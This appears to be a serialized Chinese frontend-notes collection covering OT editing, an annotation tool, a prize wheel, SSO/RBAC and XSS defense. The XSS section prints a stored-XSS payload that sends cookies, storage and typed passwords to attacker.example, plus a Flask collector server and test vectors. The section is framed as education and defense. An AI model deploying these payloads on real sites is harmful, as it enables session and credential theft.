富文本编辑器\n\n## 3. OT (Operational Transformation) 引擎\n\n- OT 引擎是实现实时协作编辑的`核心组件`\n\t- 它负责处理并解决多用户同时编辑时可能出现的`冲突`。\n- OT 引擎的主要功能和原理如下：\n\t1. 操作转换\n\t2. 一致性维护\n\t3. 因果关系保持\n\t4. 收敛性保证\n\n### 3.1. 操作转换\n\n操作转换是 OT 引擎的核心功能。当两个用户同时对文档进行编辑时，OT 引擎需要转换这些操作，使它们能够正确应用，并保持所有用户看到的文档内容一致。\n\n例如，考虑以下场景：\n- 初始文档内容: \"Hello\"\n- 用户A\n\t- 在位置5插入\"!\"\n- 用户B\n\t- 在位置5插入\" World\"\n\n没有 OT,这两个操作可能会导致不一致的结果。但通过 OT，我们可以转换这些操作,使得最终结果一致。\n\n让我用一个图表来说明这个过程：\n\n````mermaid\n    sequenceDiagram\n    participant A as 用户A\n    participant Server\n    participant B as 用户B\n    \n    Note over A,B: 初始文档: \"Hello\"\n    A->>Server: 插入 \"!\" 在位置 5\n    B->>Server: 插入 \" World\" 在位置 5\n    Server->>Server: 转换操作\n    Server->>A: 应用: 插入 \" World\" 在位置 5\n    Server->>B: 应用: 插入 \"!\" 在位置 11\n    Note over A,B: 最终文档: \"Hello World!\"\n````\n\n### 3.2. 一致性维护\n\nOT 引擎需要确保所有客户端最终达到相同的文档状态。\n这通常通过以下方式实现：\n- 维护操作历史\n- 使用版本向量或时间戳\n- 定期同步完整文档状态\n\n### 3.3. 因果关系保持\n\nOT 引擎需要保证操作的因果关系\n- 例如\n\t- 如果操作 A 在操作 B 之前发生，那么在所有客户端上，A 都应该在 B 之前应用。\n\n### 3.4. 收敛性保证\n\n无论操作以何种顺序到达，OT 引擎都需要确保所有客户端最终收敛到相同的文档状态。\n\n下面是一个简化的 OT 引擎实现示例,展示了基本的操作转换逻辑：\n\n````typescript\nclass OTEngine {\n\tprivate document: string = '';\n\tprivate version: number = 0;\n\tprivate history: Operation[] = [];\n\n\t// 操作转换函数\n\ttransform(op1: Operation, op2: Operation): Operation {\n\t\tif (op1.type === 'insert' && op2.type === 'insert') {\n\t\t\tif (op1.position <= op2.position) {\n\t\t\t\treturn {...op2, position: op2.position + 1};\n\t\t\t}\n\t\t} else if (op1.type === 'delete' && op2.type === 'insert') {\n\t\t\tif (op1.position < op2.position) {\n\t\t\t\treturn {...op2, position: op2.position - 1};\n\t\t\t}\n\t\t} else if (op1.type === 'insert' && op2.type === 'delete') {\n\t\t\tif (op1.position <= op2.position) {\n\t\t\t\treturn {...op2, position: op2.position + 1};\n\t\t\t}\n\t\t} else if (op1.type === 'delete' && op2.type === 'delete') {\n\t\t\tif (op1.position < op2.position) {\n\t\t\t\treturn {...op2, position: op2.position - 1};\n\t\t\t}\n\t\t}\n\t\treturn op2;\n\t}\n\n\t// 应用操作\n\tapplyOperation(op: Operation): void {\n\t\t// 转换操作\n\t\tfor (const historyOp of this.history) {\n\t\t\top = this.transform(historyOp, op);\n\t\t}\n\n\t\t// 应用操作到文档\n\t\tif (op.type === 'insert') {\n\t\t\tthis.document = this.document.slice(0, op.position) + \n\t\t\t\t\t\t\top.char + \n\t\t\t\t\t\t\tthis.document.slice(op.position);\n\t\t} else if (op.type === 'delete') {\n\t\t\tthis.document = this.document.slice(0, op.position) + \n\t\t\t\t\t\t\tthis.document.slice(op.position + 1);\n\t\t}\n\n\t\t// 更新版本和历史\n\t\tthis.version++;\n\t\tthis.history.push(op);\n\t}\n\n\tgetDocument(): string {\n\t\treturn this.document;\n\t}\n\n\tgetVersion(): number {\n\t\treturn this.version;\n\t}\n}\n\ninterface Operation {\n\ttype: 'insert' | 'delete';\n\tposition: number;\n\tchar?: string;\n}\n````\n\n## 4. 最后\n\n- 在实际项目中,通常会**使用成熟的 OT 库或协作框架,如 ShareDB、Yjs 或 Automerge**，它们提供了更完善和经过实战测试的实现。\n- 这些库不仅实现了 OT,有些还支持 CRDT (Conflict-free Replicated Data Types),为实时协作提供了更强大的支持。\n","cAbNIMoo":"\n# UI 标记工具设计\n\n`#系统设计` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. 原理 \n\n从下面几个关键点来解释这些工具的工作原理：\n\n1. 图像渲染和交互层\n2. 数据结构和存储\n3. 绘制和编辑功能\n4. 坐标系统和缩放处理\n5. 数据导出和集成\n\n### 1.1. 图像渲染和交互层\n\n```javascript hl:14\nconst canvas = document.createElement('canvas');\nconst ctx = canvas.getContext('2d');\n\n// 加载图像\nconst image = new Image();\nimage.onload = () => {\n    canvas.width = image.width;\n    canvas.height = image.height;\n    ctx.drawImage(image, 0, 0);\n};\nimage.src = 'path/to/image.jpg';\n\n// 添加交互层\ncanvas.addEventListener('mousedown', handleMouseDown);\ncanvas.addEventListener('mousemove', handleMouseMove);\ncanvas.addEventListener('mouseup', handleMouseUp);\n```\n\n这段代码展示了如何创建一个基本的画布并加载图像。\n\n交互层通过`事件监听器`实现，允许用户与图像进行交互。\n\n### 1.2. 数据结构和存储\n\n对于**标记数据**，我们可以使用类似以下的数据结构：\n\n```javascript\nconst annotations = [\n    {\n        type: 'rectangle',\n        x: 100,\n        y: 150,\n        width: 200,\n        height: 100,\n        label: 'Object 1'\n    },\n    {\n        type: 'polygon',\n        points: [{x: 300, y: 200}, {x: 350, y: 250}, {x: 300, y: 300}],\n        label: 'Object 2'\n    }\n];\n```\n\n这种结构可以轻松地序列化为JSON，方便存储和传输。\n\n### 1.3. 绘制和编辑功能\n\n绘制功能可以通过Canvas API实现：\n\n```javascript\nfunction drawAnnotations() {\n    annotations.forEach(annotation => {\n        ctx.beginPath();\n        if (annotation.type === 'rectangle') {\n            ctx.rect(annotation.x, annotation.y, annotation.width, annotation.height);\n        } else if (annotation.type === 'polygon') {\n            ctx.moveTo(annotation.points[0].x, annotation.points[0].y);\n            annotation.points.slice(1).forEach(point => {\n                ctx.lineTo(point.x, point.y);\n            });\n            ctx.closePath();\n        }\n        ctx.stroke();\n    });\n}\n```\n\n编辑功能可以通过检测鼠标位置是否在标注区域内来实现。\n\n### 1.4. 坐标系统和缩放处理\n\n处理缩放时，需要在原始坐标和显示坐标之间进行转换：\n\n```javascript hl:19\nlet scale = 1;\n\nfunction scaleCoordinates(x, y) {\n    return {\n        x: x / scale,\n        y: y / scale\n    };\n}\n\nfunction handleZoom(event) {\n    const delta = event.deltaY;\n    scale += delta > 0 ? -0.1 : 0.1;\n    scale = Math.max(0.1, Math.min(scale, 5)); // 限制缩放范围\n\n    // 重新绘制画布\n    redrawCanvas();\n}\n\ncanvas.addEventListener('wheel', handleZoom);\n```\n\n### 1.5. 数据导出和集成\n\n数据导出可以简单地将annotations数组转换为JSON：\n\n```javascript\nfunction exportAnnotations() {\n    return JSON.stringify(annotations);\n}\n```\n\n## 2. React 简易实现\n\n为了更好地理解这些原理，我们可以创建一个简单的UI标记工具的原型。这里我会使用 React 和 Canvas API 来实现一个基础版本：\n\n```jsx\nimport React, { useRef, useEffect, useState } from 'react';\n\nconst AnnotationTool = () => {\n    const canvasRef = useRef(null);\n    const [annotations, setAnnotations] = useState([]);\n    const [currentAnnotation, setCurrentAnnotation] = useState(null);\n    const [isDrawing, setIsDrawing] = useState(false);\n\n    useEffect(() => {\n        const canvas = canvasRef.current;\n        const ctx = canvas.getContext('2d');\n        const image = new Image();\n        image.onload = () => {\n            canvas.width = image.width;\n            canvas.height = image.height;\n            ctx.drawImage(image, 0, 0);\n            drawAnnotations();\n        };\n        image.src = 'path/to/your/image.jpg';\n    }, []);\n\n    const drawAnnotations = () => {\n        const canvas = canvasRef.current;\n        const ctx = canvas.getContext('2d');\n        ctx.clearRect(0, 0, canvas.width, canvas.height);\n        ctx.drawImage(image, 0, 0);\n\n        annotations.forEach(ann => {\n            ctx.beginPath();\n            ctx.rect(ann.x, ann.y, ann.width, ann.height);\n            ctx.stroke();\n        });\n\n        if (currentAnnotation) {\n            ctx.beginPath();\n            ctx.rect(\n                currentAnnotation.x,\n                currentAnnotation.y,\n                currentAnnotation.width,\n                currentAnnotation.height\n            );\n            ctx.stroke();\n        }\n    };\n\n    const handleMouseDown = (e) => {\n        const { offsetX, offsetY } = e.nativeEvent;\n        setCurrentAnnotation({ x: offsetX, y: offsetY, width: 0, height: 0 });\n        setIsDrawing(true);\n    };\n\n    const handleMouseMove = (e) => {\n        if (!isDrawing) return;\n        const { offsetX, offsetY } = e.nativeEvent;\n        setCurrentAnnotation(prev => ({\n            ...prev,\n            width: offsetX - prev.x,\n            height: offsetY - prev.y\n        }));\n        drawAnnotations();\n    };\n\n    const handleMouseUp = () => {\n        setIsDrawing(false);\n        if (currentAnnotation) {\n            setAnnotations([...annotations, currentAnnotation]);\n            setCurrentAnnotation(null);\n        }\n    };\n\n    return (\n        <div>\n            <canvas\n                ref={canvasRef}\n                onMouseDown={handleMouseDown}\n                onMouseMove={handleMouseMove}\n                onMouseUp={handleMouseUp}\n            />\n            <button onClick={() => console.log(JSON.stringify(annotations))}>\n                Export Annotations\n            </button>\n        </div>\n    );\n};\n\nexport default AnnotationTool;\n```\n\n## 3. 总结\n\n- 实际的UI标记工具会更复杂，可能包括更多的特性，如多种标注形状、标签管理、撤销/重做功能、缩放和平移等。\n- 上面的例子展示了核心原理\n- 在实际开发中，可能会使用专门的库（如 `Fabric.js` 或 Konva.js ）来处理更复杂的交互和渲染需求。\n","PMjE1JNb":"\n# 图标库管理系统设计\n\n\n`#系统设计` \n\n\n## 目录\n<!-- toc -->\n ## 1. 前后端模块及服务架构图 \n\n![图片&文件](./files/20241114-3.png)\n\n## 2. 数据库设计\n\n![图片&文件](./files/20241114-4.png)\n\n## 3. 功能清单列举\n\n- 图标上传处理\n\t- 处理 SVG\n\t\t- 移除无用属性\n\t\t- 压缩路径\n\t\t- 标准化色值\n\t- 处理 PNG\n\t- 提取元信息\n\t\t- 尺寸\n\t\t- 颜色信息\n\t\t- 复杂度\n- 搜索功能实现\n\t- 分词处理\n\t- 执行搜索\n\t- 结果排序和评分\n- 性能优化：\n\t- 使用 `CDN` 分发图标资源\n\t- 实现图标懒加载\n\t- 使用 `WebP` 格式优化预览图\n\t- 实现客户端缓存策略\n- 用户体验：\n\t- 支持拖拽上传\n\t- 提供批量操作功能\n\t- 实现快捷键操作\n\t- 支持预览大图\n- 安全性：\n\t- 文件上传验证\n\t- 防止XSS攻击\n\t- 访问权限控制\n\t- 操作日志记录\n- 可扩展性：\n\t- 支持插件系统\n\t- 提供API接口\n\t- 支持自定义主题\n\t- 多语言支持\n- 部署和监控：\n\t- 部署策略：\n\t\t- 使用容器化部署\n\t\t- 实现自动化部署\n\t\t- 配置 CDN\n\t\t- 实现负载均衡\n\t- 监控指标：\n\t\t- 系统性能监控\n\t\t- 用户行为分析\n\t\t- 错误日志收集\n\t\t- 资源使用监控\n\n","60bVx35w":"\n# 转盘组件设计\n\n`#系统设计` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. 业务需求细节 \n\n首先，当然需要和各方**对齐业务需求细节**\n\n## 2. 技术实现考虑\n\n### 2.1. 渲染方式选择\n\n#### 2.1.1. **Canvas 方案**\n\n```typescript\nclass WheelCanvas {\n    private canvas: HTMLCanvasElement;\n    private ctx: CanvasRenderingContext2D;\n    \n    constructor(config: WheelConfig) {\n        this.canvas = document.createElement('canvas');\n        this.ctx = this.canvas.getContext('2d')!;\n        this.initCanvas(config);\n    }\n    \n    private drawSector(startAngle: number, endAngle: number, color: string) {\n        this.ctx.beginPath();\n        this.ctx.moveTo(this.centerX, this.centerY);\n        this.ctx.arc(this.centerX, this.centerY, this.radius, startAngle, endAngle);\n        this.ctx.fillStyle = color;\n        this.ctx.fill();\n    }\n    \n    private drawPrizes() {\n        // 绘制奖品文字和图片\n    }\n}\n```\n\n#### 2.1.2. **CSS Transform 方案**\n\n```typescript\nclass WheelCSS {\n    private container: HTMLElement;\n    \n    constructor(config: WheelConfig) {\n        this.container = document.createElement('div');\n        this.initWheel(config);\n    }\n    \n    private rotate(degree: number) {\n        this.container.style.transform = `rotate(${degree}deg)`;\n    }\n}\n```\n\n### 2.2. 动画实现\n\n```typescript\nclass WheelAnimation {\n    private currentRotation: number = 0;\n    private isSpinning: boolean = false;\n    \n    spin(targetDegree: number) {\n        if (this.isSpinning) return;\n        \n        this.isSpinning = true;\n        const startTime = performance.now();\n        const duration = 5000; // 5秒\n        \n        const animate = (currentTime: number) => {\n            const elapsed = currentTime - startTime;\n            const progress = Math.min(elapsed / duration, 1);\n            \n            // 使用缓动函数\n            const easeProgress = this.easeInOutQuad(progress);\n            const currentDegree = this.currentRotation + (targetDegree * easeProgress);\n            \n            this.rotate(currentDegree);\n            \n            if (progress < 1) {\n                requestAnimationFrame(animate);\n            } else {\n                this.isSpinning = false;\n                this.currentRotation = targetDegree % 360;\n            }\n        };\n        \n        requestAnimationFrame(animate);\n    }\n    \n    private easeInOutQuad(t: number): number {\n        return t < 0.5 ? 2 * t * t : -1 + (4 - 2 * t) * t;\n    }\n}\n```\n\n## 3. 交互体验优化&性能\n\n- 性能保证\n- 弱网环境\n- loading \n- 设备兼容性\n\t- 如果在 APP 中需要原生 APP 能力的一些支持\n- 添加音效\n- 动画性能保证\n- 主题设置等\n- 单元测试\n- 容错及异常情况能力\n\n## 4. API 设计\n\n```typescript\nclass LuckyWheel {\n    constructor(config: WheelConfig) {\n        this.init(config);\n    }\n    \n    // 公共方法\n    public spin(targetIndex?: number): Promise<Prize> {\n        return new Promise((resolve, reject) => {\n            // 实现转盘旋转逻辑\n        });\n    }\n    \n    public stop() {\n        // 停止转盘\n    }\n    \n    public updatePrizes(prizes: Prize[]) {\n        // 更新奖品配置\n    }\n    \n    // 事件监听\n    public on(event: WheelEvent, callback: Function) {\n        // 添加事件监听\n    }\n}\n\n// 使用示例\nconst wheel = new LuckyWheel({\n    prizes: [...],\n    size: 400,\n    duration: 5000,\n    rotations: 6,\n    easing: 'easeInOutQuad'\n});\n\nwheel.on('spinStart', () => console.log('开始旋转'));\nwheel.on('spinEnd', (prize) => console.log('停止旋转，中奖：', prize));\n\nwheel.spin().then(prize => {\n    console.log('恭喜获得：', prize.name);\n});\n```\n\n## 5. 后端交互设计\n\n### 5.1. API 设计\n\n```typescript\ninterface SpinResult {\n    prizeId: string;\n    angle: number;\n    message: string;\n}\n\nclass WheelBackendInteraction {\n    private apiUrl: string;\n\n    constructor(apiUrl: string) {\n        this.apiUrl = apiUrl;\n    }\n\n    async requestSpin(): Promise<SpinResult> {\n        try {\n            const response = await fetch(`${this.apiUrl}/spin`, {\n                method: 'POST',\n                headers: {\n                    'Content-Type': 'application/json',\n                    'Authorization': `Bearer ${this.getToken()}`\n                },\n                body: JSON.stringify({\n                    userId: this.getUserId(),\n                    timestamp: Date.now()\n                })\n            });\n\n            if (!response.ok) {\n                throw new Error('Spin request failed');\n            }\n\n            return await response.json();\n        } catch (error) {\n            console.error('Spin request error:', error);\n            throw error;\n        }\n    }\n\n    private getToken(): string {\n        // 获取用户认证token\n        return localStorage.getItem('authToken') || '';\n    }\n\n    private getUserId(): string {\n        // 获取用户ID\n        return localStorage.getItem('userId') || '';\n    }\n}\n```\n\n### 5.2. 结果验证\n\n```typescript\nclass ResultVerification {\n    verifyResult(clientResult: SpinResult, serverResult: SpinResult): boolean {\n        return clientResult.prizeId === serverResult.prizeId &&\n               Math.abs(clientResult.angle - serverResult.angle) < 1; // 允许小误差\n    }\n}\n```\n\n## 6. 安全措施\n\n- 请求签名\n- 检查用户权限和资格\n- 请求限流\n- **防刷和作弊预防**\n\t- 前端防刷\n\t- 设备指纹\n\t- 数据加密\n- 错误处理和日志\n- 实施 IP 封禁或账户冻结机制\n- 中奖算法\n- 实施实时监控系统，对异常行为进行快速响应。\n\n## 7. 其他\n\n![图片&文件](./files/20241111-51.png)\n","3KsHuUNL":"\n# SSO 系统与权限系统设计\n\n`#系统设计` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. SSO 系统要素 \n\n- 需要有一个`sso.domain.com`的站点\n\t- 同域，都会携带一个`AuthToken` 来校验身份就好\n\t- `跨域`，主要流程就是`sso`系统会上生成一个`service ticket` \n\t\t- 然后重定向到应用服务，应用服务再根据`st` 想sso服务发送验证，成功后写入应用域名cookie，如下图\n\t\t\t- ![图片&文件](./files/20241114-5.png)\n- redis 缓存登录信息\n- 数据库存储用户信息等\n- 权限系统\n\t- 一般都会 sso 服务配合使用\n\n## 2. 权限系统\n\n- 一般和`sso`服务是搭起来的\n- `RBAC`（Role-Based Access Control ）基于角色的访问控制\n\t- 当初用的这个权限引擎方案 `Casbin` \n\t\t- go 语言和 nodejs 版本\n- 在这个模型中，有三种实体：\n\t- 角色：`subject`(用户可以与角色合并成为 subject，于是角色组也可以表示了)；\n\t- 资源：`object`;\n\t- 操作：`action`;\n- 举例：模型对象：规则\n\t- p, alice, data1, read\n\t- p, bob, data2, write  \n    \n![图片&文件](./files/20241114-6.png)\n","Q4nISSfz":"\n# 前言\n\n\n> 前端安全需知\n\n","iCeiAFpR":"\n# XSS：跨站脚本攻击\n\n`#前端安全` \n\n\n## 目录\n<!-- toc -->\n ## 1. 之前的笔记 \n\n### 1.1. 必要条件\n\nXSS 攻击有 `两大要素`\n1. `攻击者` 提交 `恶意代码`\n2. `浏览器` 执行 `恶意代码`\n\n### 1.2. 示例\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/20241023205929.png?imageSlim)\n\n### 1.3. 如何解决？\n\n![图片&文件](./files/20241023.png)\n\n### 1.4. 如何防范\n\n- 验证码\n- 输入内容长度控制\n- 使用 `escapeHTML` （需要自己实现）\n- set HTTP-only Cookie \n\t- 当一个 Cookie 被设置为 `HttpOnly` 时，它仅可通过 HTTP(S) 协议访问。\n\t\t- JavaScript 的 `document.cookie` API 将无法读取或修改这些 Cookie\n\t- `Set-Cookie: session=abcdef123456; HttpOnly; Secure`\n\t\t- 这里，`HttpOnly` 确保 Cookie 只能通过 HTTP(S) 访问，`Secure` 确保 Cookie 只通过加密的 HTTPS 连接传输。\n- **内容安全策略（CSP）**\n\t- 实施严格的内容安全策略。\n\t- 限制可以加载和执行的资源。\n\t- 比如 `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;`\n\n### 1.5. 分类\n\n![图片&文件](./files/2024102310.png)\n\n## 2. XSS（Cross-Site Scripting，跨站脚本攻击）的原理、类型和防御方法。\n\n### 2.1. XSS 概述\n\n- XSS 是一种代码注入攻击，攻击者通过在目标网站上**注入恶意脚本，使之在用户的浏览器上运行**。\n- 当被攻击网站没有对用户输入进行充分过滤，就会导致攻击者的恶意脚本被执行。\n\n### 2.2. XSS 的危害\n\n- **窃取用户信息**\n\t- Cookie/Session 信息\n\t- 用户隐私数据\n\t- 登录凭证\n- **网络钓鱼**\n\t- 伪造登录框\n\t- 诱导用户输入敏感信息\n- **篡改页面内容**\n\t- 植入恶意广告\n\t- 修改页面展示\n\t- 破坏网站正常功能\n- **利用用户权限**\n\t- 以用户身份发送请求\n\t- 执行特权操作\n\n### 2.3. XSS 的三种类型\n\n#### 2.3.1. 反射型 XSS（非持久型）\n\n- 反射型 XSS 是最简单的 XSS 攻击。\n- 攻击者将恶意代码拼接在 `URL` 中，`服务器`接收到请求后，将**恶意代码\"反射\"回浏览器执行**。\n\t- 总结：前端提交 → 后端处理 → 再反射回前端执行\n\n```javascript hl:1,4\n// 示例 URL\nhttp://example.com/search?q=<script>alert('XSS')</script>\n\n// 易受攻击的服务器代码\napp.get('/search', (req, res) => {\n    res.send(`搜索结果：${req.query.q}`); // 直接输出用户输入\n});\n```\n\n#### 2.3.2. 存储型 XSS（持久型）\n\n- 存储型 XSS 是最危险的 XSS 攻击。\n- 攻击者将恶意代码存储在目标服务器上（如数据库中），当**其他用户**浏览包含此恶意代码的页面时，就会执行攻击代码。\n\t- 影响范围大，因为**不止影响用户自己**\n\n```javascript\n// 典型场景：评论系统\n// 攻击者提交的评论\nconst maliciousComment = `\n    <script>\n        // 窃取 cookie\n        new Image().src = 'http://attacker.com/steal?cookie=' + document.cookie;\n    </script>\n`;\n\n// 易受攻击的服务器代码\napp.post('/comment', (req, res) => {\n    db.comments.save(req.body.comment); // 直接存储用户输入\n});\n```\n\n#### 2.3.3. DOM 型 XSS\n\n- DOM 型 XSS 是一种特殊的 XSS\n- 它的特点是攻击代码**不需要服务器参与**，而是通过修改页面 DOM 节点来完成攻击。\n\t- **前端自己消费自己**\n\n```javascript\n// 易受攻击的客户端代码\nconst hash = location.hash.substring(1);\ndocument.getElementById('output').innerHTML = decodeURIComponent(hash);\n\n// 攻击 URL\nhttp://example.com#<img src=\"x\" onerror=\"alert('XSS')\">\n```\n\n### 2.4. XSS 防御策略\n\n#### 2.4.1. 输入过滤\n\n对用户输入进行严格过滤和验证：\n\n```javascript\n// 使用 DOMPurify 库过滤 HTML\nimport DOMPurify from 'dompurify';\n\nconst clean = DOMPurify.sanitize(dirtyInput, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],\n    ALLOWED_ATTR: []\n});\n```\n\n#### 2.4.2. 输出编码\n\n在输出用户输入时进行适当的编码：\n\n```javascript\n// HTML 编码函数\nfunction htmlEncode(str) {\n    return str.replace(/[&<>\"']/g, function(match) {\n        const escape = {\n            '&': '&amp;',\n            '<': '&lt;',\n            '>': '&gt;',\n            '\"': '&quot;',\n            \"'\": '&#39;'\n        };\n        return escape[match];\n    });\n}\n\n// 在不同上下文中使用不同的编码方式\n// HTML 上下文\nelement.textContent = userInput; // 自动编码\n// HTML 属性\nelement.setAttribute('data-value', userInput);\n// JavaScript 上下文\nconst json = JSON.stringify(userInput);\n```\n\n#### 2.4.3. CSP（内容安全策略）\n\n配置严格的 CSP 策略：\n\n```http\n// HTTP 头部设置\nContent-Security-Policy: default-src 'self';\n                        script-src 'self' 'nonce-random123';\n                        style-src 'self';\n                        img-src 'self' https:;\n```\n\n```html\n<!-- HTML meta 标签设置 -->\n<meta http-equiv=\"Content-Security-Policy\" \n      content=\"default-src 'self'; script-src 'self' 'nonce-random123';\">\n```\n\n#### 2.4.4. HttpOnly Cookie\n\n防止 JavaScript 访问敏感 Cookie：\n\n```http\nSet-Cookie: sessionId=abc123; HttpOnly; Secure\n```\n\n\n解释：\n1. **基本键值对**：\n\t- `sessionId=abc123`：设置一个名为 \"sessionId\" 的 Cookie，其值为 \"abc123\"\n2. **安全标记**：\n\t- `HttpOnly`：\n\t\t- 这个标记表示该 Cookie 只能通过 HTTP(S) 协议访问，不能通过 JavaScript 的 `document.cookie` 来访问。\n\t\t- 这是一个安全措施，可以防止 XSS（跨站脚本攻击）获取到 Cookie 的值。\n\t- `Secure`：\n\t\t- 这个标记表示 **Cookie 只能通过 HTTPS 安全连接传输**，不能通过普通的 HTTP 连接传输。\n\t\t- 这可以防止 Cookie 在传输过程中**被中间人攻击截获**。\n\n### 2.5. 框架级别的 XSS 防护\n\n#### 2.5.1. React\n\nReact 默认会转义所有输出：\n\n```jsx hl:8\n// 安全：自动转义\nconst Component = () => {\n    return <div>{userInput}</div>;\n};\n\n// 危险：手动标记为可信内容\nconst Component = () => {\n    return <div dangerouslySetInnerHTML={{__html: userInput}} />;\n};\n```\n\n#### 2.5.2. Vue\n\nVue 也提供了类似的保护：\n\n```vue hl:8\n<!-- 安全：自动转义 -->\n<template>\n    <div>{{ userInput }}</div>\n</template>\n\n<!-- 危险：原始 HTML -->\n<template>\n    <div v-html=\"userInput\"></div>\n</template>\n```\n\n### 2.6. XSS 防护最佳实践\n\n#### 2.6.1. **永远不信任用户输入**\n\n   ```javascript\n   // 验证和净化所有用户输入\n   const sanitizedInput = validator.escape(userInput);\n   ```\n\n#### 2.6.2. **使用合适的上下文编码**\n\n   ```javascript\n   // HTML 上下文\n   const htmlContext = htmlEncode(userInput);\n   // URL 上下文\n   const urlContext = encodeURIComponent(userInput);\n   // JavaScript 上下文\n   const jsContext = JSON.stringify(userInput);\n   ```\n\n#### 2.6.3. **实施 CSP**\n\n   - 限制资源来源\n   - 禁用危险特性\n   - 启用报告功能\n\n#### 2.6.4. **使用现代框架**\n\n   - 利用框架内置的 XSS 防护\n   - 避免**使用危险的 API**\n\n#### 2.6.5. **定期安全审计**\n\n   - 代码审查\n   - 渗透测试\n   - 漏洞扫描\n\n### 2.7. XSS 防护检查清单\n\n- [ ] 输入验证和过滤\n\t- [ ] 白名单验证\n\t- [ ] 特殊字符过滤\n\t- [ ] 长度限制\n- [ ] 输出编码\n\t- [ ] HTML 编码\n\t- [ ] JavaScript 编码\n\t- [ ] URL 编码\n\t- [ ] CSS 编码\n- [ ] CSP 配置\n\t- [ ] 限制资源来源\n\t- [ ] 禁用 inline 脚本\n\t- [ ] 配置报告机制\n- [ ] Cookie 安全\n\t- [ ] HttpOnly 标记\n\t- [ ] Secure 标记\n\t- [ ] SameSite 属性\n- [ ] 框架安全\n\t- [ ] 使用最新版本\n\t- [ ] 启用安全特性\n\t- [ ] 避免危险 API\n\n## 3. 一个 **窃取用户信息**XSS 攻击示例\n\n### 3.1. 攻击场景设置\n\n假设有一个社交网站 `social.example.com`，它有一个**评论功能**。用户可以发表评论，评论内容会被显示在页面上。\n\n### 3.2. 漏洞代码示例\n\n假设网站的评论展示代码如下：包括前后端代码处理逻辑\n\n```javascript\n// 后端代码 (Node.js + Express)\napp.post('/comment', (req, res) => {\n    const comment = req.body.comment;\n    // 直接存储用户输入，没有进行任何过滤\n    db.saveComment(comment);\n});\n\n// 前端展示代码\nfunction displayComment(comment) {\n    // 直接插入 HTML，存在 XSS 漏洞\n    document.getElementById('comments').innerHTML += comment;\n}\n```\n\n### 3.3. 攻击代码示例\n\n攻击者可以**提交以下评论内容**：\n\n```html hl:5,31,39\n<script>\n    // 创建一个用于收集信息的函数\n    function stealInfo() {\n        // 收集用户 Cookie\n        const cookies = document.cookie;\n        \n        // 收集用户的本地存储数据\n        const localStorage = JSON.stringify(window.localStorage);\n        \n        // 收集用户的会话存储数据\n        const sessionStorage = JSON.stringify(window.sessionStorage);\n        \n        // 收集用户的基本信息\n        const userInfo = {\n            url: window.location.href,\n            userAgent: navigator.userAgent,\n            screenRes: `${window.screen.width}x${window.screen.height}`,\n            language: navigator.language,\n            platform: navigator.platform\n        };\n\n        // 构造要发送的数据\n        const stolenData = {\n            cookies,\n            localStorage,\n            sessionStorage,\n            userInfo,\n            timestamp: new Date().toISOString()\n        };\n\n        // 创建图片请求来发送数据（避免跨域限制）\n        const img = new Image();\n        img.src = `https://attacker.example/collect?data=${encodeURIComponent(JSON.stringify(stolenData))}`;\n    }\n\n    // 立即执行信息收集\n    stealInfo();\n\n    // 监听用户输入（例如捕获用户在网站上输入的信息）\n    document.addEventListener('change', function(e) {\n        if(e.target.type === 'password' || e.target.type === 'text' || e.target.type === 'email') {\n            const inputData = {\n                type: e.target.type,\n                name: e.target.name,\n                value: e.target.value\n            };\n            \n            // 发送用户输入数据\n            const img = new Image();\n            img.src = `https://attacker.example/collect?input=${encodeURIComponent(JSON.stringify(inputData))}`;\n        }\n    });\n</script>\n```\n\n### 3.4. 攻击者的服务器端代码（示例）： `https://attacker.example/collect`\n\n```python hl:24\n# 攻击者的服务器 (Python + Flask)\nfrom flask import Flask, request\nimport json\nfrom datetime import datetime\n\napp = Flask(__name__)\n\n@app.route('/collect')\ndef collect():\n    # 获取窃取的数据\n    stolen_data = request.args.get('data')\n    \n    if stolen_data:\n        # 解码数据\n        data = json.loads(stolen_data)\n        \n        # 保存到文件\n        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')\n        filename = f'stolen_data_{timestamp}.json'\n        \n        with open(filename, 'w') as f:\n            json.dump(data, f, indent=2)\n    \n    # 返回 1x1 透明 GIF\n    return b'\\x47\\x49\\x46\\x38\\x39\\x61\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\xff\\xff\\xff\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x02\\x02\\x44\\x01\\x00\\x3b'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n```\n\n### 3.5. 攻击流程说明\n\n- **植入阶段**：\n\t- 攻击者在评论区提交包含恶意脚本的内容\n\t- 由于网站没有 proper 的过滤，脚本被存储到数据库中\n- **触发阶段**：\n\t- **其他用户访问包含恶意评论的页面**\n\t- **浏览器加载并执行恶意脚本**\n- **数据收集阶段**：\n\t- **脚本自动收集用户的 Cookie、本地存储等信息**\n\t- **监听用户的输入行为**\n- **数据传输阶段**：\n\t- 使用图片请求方式绕过**跨域**限制\n\t\t- 并且返回一个透明的图片\n\t- 将收集到的数据发送到攻击者的服务器\n\n### 3.6. 防御措施\n\n#### 3.6.1. **输入过滤**：\n\n```javascript\nfunction sanitizeInput(input) {\n    return input.replace(/[<>]/g, function(match) {\n        return {\n            '<': '&lt;',\n            '>': '&gt;'\n        }[match];\n    });\n}\n\n// 使用\napp.post('/comment', (req, res) => {\n    const comment = sanitizeInput(req.body.comment);\n    db.saveComment(comment);\n});\n```\n\n#### 3.6.2. **CSP 设置**：\n\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self'; connect-src 'self';\n```\n\n#### 3.6.3. **HttpOnly Cookie**：\n\n```http\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n```\n\n#### 3.6.4. **安全的 DOM 操作**：\n\n```javascript hl:3\nfunction displayComment(comment) {\n    const div = document.createElement('div');\n    div.textContent = comment; // 使用 textContent 而不是 innerHTML\n    document.getElementById('comments').appendChild(div);\n}\n```\n\n### 3.7. 检测方法\n\n可以使用以下代码来检测页面是否容易受到 XSS 攻击：\n\n```javascript\n// 测试向量\nconst testVectors = [\n    '<script>alert(1)</script>',\n    '<img src=x onerror=alert(1)>',\n    